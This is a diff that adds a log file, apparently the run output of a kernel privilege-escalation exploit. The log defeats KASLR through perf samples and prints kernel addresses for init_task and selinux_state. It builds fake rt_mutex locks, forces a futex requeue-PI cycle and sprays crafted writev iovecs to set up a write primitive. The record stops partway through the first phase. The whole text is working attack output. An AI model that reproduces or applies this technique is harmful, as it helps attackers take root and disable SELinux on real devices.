@@ -1,0 +1,20 @@
+[main] g_iov_idx=0 (override with IOV_IDX=k)  spray=writev
+[kaslr] perf text-base=ffffffe598400000 min_kip=ffffffe5984a2190 samples=18
+[kaslr] base=0xffffffe598400000 slide=0x2590400000
+  init_task   = 0xffffffe5a3043640
+  selinux_state = 0xffffffe5a31a9d78 (enforcing @ +0)
+  fake_lock   = 0xffffffe5a31ca880 (uid_lock+0x200, ZEROED BSS rt_mutex)
+  fake_lock2  = 0xffffffe5a31ca980 (uid_lock+0x300, ZEROED BSS rt_mutex)
+  safe_write  = 0xffffffe5a3153000 (empty_zero_page: low byte 0x00, byte2 0x53)
+[Y] tid=8794
+[X] tid=8795
+[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle
+[main] CMP_REQUEUE_PI returned -35 (Resource deadlock would occur)
+[main] -EDEADLK: full chainwalk caught PI cycle
+[Y] PROBE spray: DISTINCT sentinels base=SENT(100+i) len=SENT(200+i) in all 8 iovs; lock LEFT as sentinel so walk faults at first lock deref. Panic FAR/x27 = the sentinel value at the lock field -> pins base-vs-len AND the iov index of the lock field (i.e. the displacement D).
+[Y] SPRAY-DEBUG iovstack base=0x274070  &iov[4]=0x2740b0  method=writev
+[Z] tid=8796
+[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on
+[do_2] Z blocked on L2 — chain walk survived
+[do_2] PROBE: full two-phase (settle + write) with sentinels
+[do_2] PHASE1: settle ghost (lock=fake_lock@iov[0], other fields=sentinels)
